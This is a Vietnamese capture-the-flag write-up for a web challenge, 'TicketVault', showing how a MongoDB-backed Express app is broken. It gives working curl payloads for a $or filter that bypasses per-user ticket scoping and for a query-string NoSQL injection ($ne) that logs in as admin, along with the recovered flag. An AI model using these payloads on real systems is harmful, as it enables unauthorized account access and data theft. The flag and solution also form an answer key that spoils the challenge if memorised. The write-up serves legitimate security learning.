---
title: "TicketVault"
category: "Web"
tags: ["web", "nosql-injection", "mongodb", "express", "scope-bypass", "query-parser"]
solve_date: "2026-10-08T01:57:00+07:00"
language: "vi"
points: 78
---

# TicketVault — vượt owner scope và NoSQL injection ở trang đăng nhập

**Flag:** `CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}` · **Files:** `server.js` (3 163 B, SHA-256 `40a3b56881a34b7171638df9a4e7e95e6fe73c662bd11b1f8d027ab133a06e2e`), `package.json` (268 B, SHA-256 `c682ada16024da8184c6a7af5890791c2476aed80ec1bc0687f217cda9c34fe2`) · **Target:** `144.217.91.111:3001`

Flag được đọc từ ticket của admin qua hai đường khai thác dưới đây.

## Đề bài

TicketVault là một cổng hỗ trợ nội bộ nhỏ: mỗi user tạo và xem ticket của chính mình. Inbox admin có bản post-mortem của một sự cố gần đây, “nhưng dĩ nhiên bạn không được phép đọc nó”. Đề bài cung cấp `server.js` và `package.json`; service chạy tại `144.217.91.111:3001`. Mục tiêu là đọc ticket thuộc về `admin`.

## Phân tích

`server.js` chỉ dài 99 dòng, có bốn route: `/register`, `/login`, `/tickets` (GET/POST) và `/tickets/search`. Điểm đáng chú ý đầu tiên không chỉ là code đang có, mà còn là các phần bị thiếu — ba module được `require` nhưng không được cung cấp:

```js
const { connect, getDb } = require('./db');
const { resolveLoginCredentials } = require('./utils/sanitize');
const { buildScopedFilter } = require('./utils/ticketFilter');
```

Chúng được dùng đúng tại hai vị trí nhạy cảm nhất:

```js
app.post('/login', async (req, res) => {
  const { username, password } = resolveLoginCredentials(req);
  const user = await db.collection('users').findOne({ username, password });   // value goes straight into the query

app.get('/tickets', requireAuth, async (req, res) => {
  const tickets = await db.collection('tickets').find({ owner: req.session.username }).toArray();  // hard scope

app.get('/tickets/search', requireAuth, async (req, res) => {
  const filter = buildScopedFilter(req);
  const tickets = await db.collection('tickets').find(filter).toArray();       // filter assembled by hidden code
```

Điều này dẫn tới ba điểm cần lưu ý:

- Với `mongodb 5.7.0`, nếu `username`/`password` là **object** thay vì string, driver xem chúng như operator (ví dụ `{"$ne": "x"}`) — có thể tạo NoSQL injection. Cần xác định `resolveLoginCredentials` có ngăn việc này không và nó đọc input từ đâu.
- `/tickets/search` là nơi duy nhất owner scope được ghép bởi code không thể xem, nên đây là ứng viên chính để tìm cách vượt scope. Trong source được cung cấp, `/tickets` lọc owner trực tiếp.
- Express 4 mặc định dùng `query parser: extended`, nên `req.query` được `qs` parse thành **nested object** từ cú pháp như `password[$ne]=x`. Cần kiểm tra riêng kênh input này, tách biệt với request body.

## Các hướng đã thử

Các thử nghiệm sau được ghi lại trong `notes.md`:

1. **Ghi đè key `owner` trong filter:** `filter={"owner":"admin"}` trả đúng một ticket, nhưng `owner` là user đang đăng nhập — scope đã ghi đè key này.
2. **Đặt operator bên trong `owner`:** `filter={"owner":{"$ne":"__nope__"}}` vẫn chỉ trả ticket của mình; cấu trúc này giữ quan hệ AND với scope.
3. **`$where` (thực thi JavaScript):** `filter={"$where":"this.owner==='admin'"}` trả 0 ticket (một batch thử khác nhận 502 với cùng payload). Payload này không cho kết quả hữu ích; các phản hồi đó không chứng minh JavaScript không được thực thi.
4. **NoSQL injection vào `/login` qua JSON body:** `{"username":"admin","password":{"$ne":"x"}}` trả HTTP 503 và không tạo session.
5. **Trộn query với body khi thử NoSQL injection ở `/login`:** `?password[$ne]=x` cùng body `username=admin&password=zzz` trả HTTP 200 “Invalid credentials” — khi có body thì credentials được lấy từ body, query bị bỏ qua. Loại payload kết hợp này.
6. **Nested query trên tham số `q`:** `q[$ne]=zzz` trả HTTP 502.
7. **XSS/SSTI qua `subject`/`content`:** ticket có `<script>alert(1)</script>` được render thành `&lt;script&gt;...` — EJS default escaping đang bật.

Các dạng `owner` đã thử vẫn bị giới hạn trong account hiện tại. Vì không có source của `buildScopedFilter`, nên hãy thử top-level operator và đánh giá quyền truy cập dựa trên ticket trả về, thay vì tự giả định cách module này ghép filter.

## Lời giải

**Bước 1 — Tạo account thường để truy cập `/tickets/search`.** Đăng ký account mới (server không yêu cầu xác minh), sau đó gọi `/tickets/search` với session đó. Trước khai thác, user có 0–1 ticket và chỉ xem được ticket của mình.

```bash
curl -s -c jar.txt -d 'username=bob2&password=pwpw' http://144.217.91.111:3001/register
curl -s -b jar.txt 'http://144.217.91.111:3001/tickets' | grep -c 'class="ticket"'
```

**Bước 2 — Thoát owner scope bằng top-level `$or`.** Đây là đường khai thác chính, chỉ cần account thường:

```bash
curl -s -b jar.txt -G --data-urlencode 'filter={"$or":[{"owner":"admin"}]}' \
  http://144.217.91.111:3001/tickets/search
```
```text
HTTP 200, 1 ticket (owner = admin)
owner='admin' subject='Root cause analysis - incident 2024-03'
content='Postmortem notes for the March incident. Access recovery token: CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}'
```

Payload `$or` trả ticket thuộc admin cho session thường. Điều này chứng minh payload này vượt owner scope, nhưng không xác định được query cuối cùng hay chính xác cách module ẩn triển khai.

**Bước 3 — Mở rộng điều kiện `$or` để kiểm tra phạm vi truy cập.** Đổi điều kiện thành `{"owner":{"$exists":true}}`:

```bash
curl -s -b jar.txt -G --data-urlencode 'filter={"$or":[{"owner":{"$exists":true}}]}' \
  http://144.217.91.111:3001/tickets/search
```
```text
HTTP 200, 362 tickets (the whole tickets collection)
```

Có 362 kết quả cho thấy với điều kiện này có thể truy cập ticket của nhiều owner. Vì dump này chạm tới ticket của user khác, write-up chỉ giữ lại ticket admin; nội dung của các owner còn lại đã được lược khỏi `exploit-output.txt`.

**Bước 4 — Primitive thứ hai: NoSQL injection ở `/login` qua query string.** Để đọc inbox bằng session admin thực sự, khai thác `resolveLoginCredentials`. Bài học từ mục 5 ở trên: **không gửi body**. Đưa credentials hoàn toàn qua query:

```bash
curl -s -i -c admin.jar -X POST \
  'http://144.217.91.111:3001/login?username=admin&password[$ne]=x'
curl -s -b admin.jar http://144.217.91.111:3001/tickets
```
```text
HTTP 302  Location: /tickets
...
owner='admin' subject='Root cause analysis - incident 2024-03'
content='Postmortem notes for the March incident. Access recovery token: CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}'
```

`qs` parse `password[$ne]=x` thành `{"$ne": "x"}`; `resolveLoginCredentials` chuyển object này thẳng vào `findOne({username, password})`. Query khi đó có nghĩa là “tìm user `admin` có password khác `x`”, với điều kiện password lưu trong database khác `x`. So với mục 4 và 5: operator trong body bị chặn (503), còn chỉ cần **chuyển input sang query** là vượt qua được. Response cho thấy hai kênh input được xử lý khác nhau; do không có source module, chưa thể kết luận chính xác sanitizer kiểm tra field nào.

**Bước 5 — Xác minh.** Hai primitive đi qua hai module ẩn khác nhau (`utils/ticketFilter` ở Bước 2, `utils/sanitize` ở Bước 4), hai route và hai mức quyền khác nhau (user thường và admin session), nhưng đều trả cùng một giá trị — giá trị đó nằm trong ticket mà `GET /tickets` của user thường không hiển thị. `solve.py` in cả hai kết quả để đối chiếu:

```text
Got from path A: ['CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}']
Got from path B: ['CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}']
Both paths agree: ['CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}']
```

## Kết quả

```bash
python solve.py
```
```text
[A] POST /login?username=admin&password[$ne]=x (no body) -> HTTP 302 Location /tickets
    owner='admin' subject='Root cause analysis - incident 2024-03'
    content='Postmortem notes for the March incident. Access recovery token: CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}'
[B] filter admin          -> HTTP 200, 1 ticket (of which mine: 0)
    owner='admin' subject='Root cause analysis - incident 2024-03'
    content='Postmortem notes for the March incident. Access recovery token: CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}'
[B] filter whole DB       -> HTTP 200, 362 tickets (of which mine: 0)
FLAG: CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}
```

## Tái hiện

Service cần còn hoạt động tại `144.217.91.111:3001` (challenge không có artifact offline để giải lại độc lập).

```bash
python solve.py
```

Script đăng ký user mới, chạy cả hai đường khai thác, in ticket admin và flag đã khôi phục; output mẫu nằm trong `exploit-output.txt`. Nếu chạy thủ công, bốn lệnh `curl` ở Bước 1–4 là đủ, theo thứ tự: đăng ký user thường → gọi `/tickets/search` với `$or` → mở rộng `$or` để xác nhận cơ chế → gửi query-only tới `/login` để lấy admin session.
